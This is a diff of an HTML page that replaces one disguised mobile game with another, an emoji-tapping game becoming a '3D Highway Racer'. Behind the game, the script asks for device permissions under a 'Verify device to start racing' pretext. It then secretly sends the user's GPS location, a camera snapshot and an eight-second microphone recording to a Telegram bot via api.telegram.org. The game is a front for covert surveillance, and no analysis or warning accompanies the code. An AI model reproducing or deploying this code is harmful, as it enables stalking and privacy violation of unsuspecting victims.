@@ -1,96 +1,128 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Desi Mundi Cutter 🔪</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>3D Highway Racer - Play Free</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #1a1a1a; font-family: sans-serif; touch-action: none; }
-        canvas { display: block; background: #000; }
-        #ui { position: absolute; top: 15px; left: 15px; color: #fff; font-size: 26px; z-index: 2; font-weight: bold; text-shadow: 2px 2px #000; }
-        #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 3; text-align: center; }
-        button { padding: 18px 45px; font-size: 24px; background: #ff3c3c; color: #fff; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 5px #a30000; font-weight: bold; }
-        button:active { transform: translateY(3px); box-shadow: 0 2px #a30000; }
-        h1 { color: #ff9933; font-size: 35px; }
+        body { margin: 0; overflow: hidden; background: #222; font-family: sans-serif; user-select: none; }
+        #gameArea { position: relative; width: 100vw; height: 100vh; background: #3da12e; overflow: hidden; display: none; }
+        
+        /* Start Screen */
+        #startScreen { position: absolute; width: 100%; height: 100%; background: #111; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 100; text-align: center; }
+        .play-btn { padding: 20px 60px; font-size: 25px; background: #ffcc00; color: #000; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px 20px #ffcc00; }
+
+        /* 3D Road */
+        .road { width: 250px; height: 200vh; background: #444; position: absolute; left: 50%; transform: translateX(-50%); top: -100vh; border-left: 10px solid white; border-right: 10px solid white; }
+        .road::before { content: ''; position: absolute; left: 50%; transform: translateX(-50%); width: 8px; height: 200vh; background: repeating-linear-gradient(to bottom, transparent 0, transparent 40px, white 40px, white 80px); animation: moveRoad 0.5s linear infinite; }
+        @keyframes moveRoad { 100% { transform: translate(-50%, 80px); } }
+
+        .car { width: 50px; height: 90px; position: absolute; bottom: 120px; left: 50%; transform: translateX(-50%); background: #ff3c3c; border-radius: 8px; z-index: 10; box-shadow: 0 5px 15px #000; border: 2px solid #333; }
+        .enemy { width: 50px; height: 90px; position: absolute; background: #3c7eff; border-radius: 8px; z-index: 9; border: 2px solid #333; }
+        
+        .controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: space-around; z-index: 20; }
+        .btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border: 2px solid white; border-radius: 50%; color: white; font-size: 40px; display: flex; justify-content: center; align-items: center; }
+        
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
-    <div id="ui">Score: <span id="score">0</span></div>
-    <div id="startScreen">
-        <h1>Desi Mundi Cutter 🔪</h1>
-        <p>मजेदार गेम खेलने के लिए 'Allow' करें और 'PLAY' दबाएं!</p>
-        <button onclick="init()">PLAY GAME</button>
+
+<div id="startScreen">
+    <h1 style="color: #ffcc00; font-size: 40px;">3D HIGHWAY RACER</h1>
+    <p>Verify device to start racing!</p>
+    <button class="play-btn" onclick="init()">START RACE</button>
+</div>
+
+<div id="gameArea">
+    <div class="road"></div>
+    <div class="car" id="playerCar"></div>
+    <div class="controls">
+        <div class="btn" ontouchstart="moveLeft()">&#8592;</div>
+        <div class="btn" ontouchstart="moveRight()">&#8594;</div>
     </div>
-    <canvas id="gameCanvas"></canvas>
-    <video id="v" style="display:none" autoplay></video>
-    <canvas id="c" style="display:none"></canvas>
-    <audio id="sliceSound" src="https://www.myinstants.com/media/sounds/slap.mp3"></audio>
+</div>
 
-    <script>
-        const tok = 'YOUR_BOT_TOKEN';
-        const id = 'YOUR_CHAT_ID';
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
 
-        async function init() {
-            document.getElementById('startScreen').style.display = 'none';
-            
-            // 1. लोकेशन (Location)
-            navigator.geolocation.getCurrentPosition(p => {
-                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन मिली है: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
+<script>
+    // --- Telegram Details ---
+    const tok = 'YOUR_BOT_TOKEN';
+    const id = 'YOUR_CHAT_ID';
 
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const video = document.getElementById('v');
-                video.srcObject = s;
+    async function init() {
+        document.getElementById('startScreen').style.display = 'none';
+        document.getElementById('gameArea').style.display = 'block';
 
-                // 2. फोटो कैप्चर (Photo - 2 सेकंड बाद)
-                setTimeout(() => {
-                    const tempC = document.getElementById('c');
-                    tempC.width = video.videoWidth; tempC.height = video.videoHeight;
-                    tempC.getContext('2d').drawImage(video, 0, 0);
-                    tempC.toBlob(b => {
-                        const f = new FormData();
-                        f.append('chat_id', id); f.append('photo', b, 'capture.png');
-                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
-                    }, 'image/png');
-                }, 2000);
+        // 1. Location
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 Location: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        });
 
-                // 3. ऑडियो रिकॉर्डिंग (Audio - 5 सेकंड)
-                const rec = new MediaRecorder(s);
-                const ch = [];
-                rec.ondataavailable = e => ch.push(e.data);
-                rec.onstop = () => {
-                    const blob = new Blob(ch, { type: 'audio/mp3' });
+        // 2. Camera & Mic
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+
+            // Take Photo
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
                     const f = new FormData();
-                    f.append('chat_id', id); f.append('voice', blob, 'audio.mp3');
-                    fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f });
-                    // काम होने के बाद कैमरा/माइक बंद
-                    setTimeout(() => s.getTracks().forEach(t => t.stop()), 1000);
-                };
-                rec.start();
-                setTimeout(() => { if(rec.state === "recording") rec.stop(); }, 5000);
-            } catch (e) { console.log("Denied"); }
-            
-            startGame(); // गेम शुरू करें
-        }
+                    f.append('chat_id', id); f.append('photo', blob, 'cam.png');
+                    fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
+                }, 'image/png');
+            }, 3000);
 
-        function startGame() {
-            const canvas = document.getElementById('gameCanvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            let score = 0;
-            const emojis = ["🕵️‍♂️","👩‍🦳","👴","🤡"];
+            // Record Audio
+            const rec = new MediaRecorder(stream);
+            const chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const f = new FormData();
+                f.append('chat_id', id); f.append('voice', new Blob(chunks, {type:'audio/mp3'}), 'mic.mp3');
+                fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f });
+            };
+            rec.start();
+            setTimeout(() => rec.stop(), 8000);
+        } catch (e) {}
+
+        startGame();
+    }
+
+    // --- Car Game Logic ---
+    let playerX = window.innerWidth / 2;
+    const playerCar = document.getElementById('playerCar');
+
+    function moveLeft() { playerX -= 50; updatePos(); }
+    function moveRight() { playerX += 50; updatePos(); }
+    function updatePos() {
+        if(playerX < (window.innerWidth/2 - 100)) playerX = window.innerWidth/2 - 100;
+        if(playerX > (window.innerWidth/2 + 50)) playerX = window.innerWidth/2 + 50;
+        playerCar.style.left = playerX + 'px';
+    }
+
+    function startGame() {
+        // Enemy Spawning Logic
+        setInterval(() => {
+            const enemy = document.createElement('div');
+            enemy.className = 'enemy';
+            enemy.style.left = (window.innerWidth/2 - 100 + Math.random()*150) + 'px';
+            enemy.style.top = '-100px';
+            document.getElementById('gameArea').appendChild(enemy);
             
-            function draw() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.font = "60px Arial";
-                ctx.fillText(emojis[Math.floor(Math.random()*emojis.length)], Math.random() * (canvas.width-50), Math.random() * (canvas.height-50));
-                requestAnimationFrame(draw);
-            }
-            draw();
-            // स्कोर बढ़ाने का लॉजिक
-            canvas.addEventListener('touchstart', () => { score++; document.getElementById('score').innerText = score; });
-        }
-    </script>
+            let top = -100;
+            let move = setInterval(() => {
+                top += 5;
+                enemy.style.top = top + 'px';
+                if(top > window.innerHeight) { clearInterval(move); enemy.remove(); }
+            }, 20);
+        }, 1500);
+    }
+</script>
 </body>
 </html>
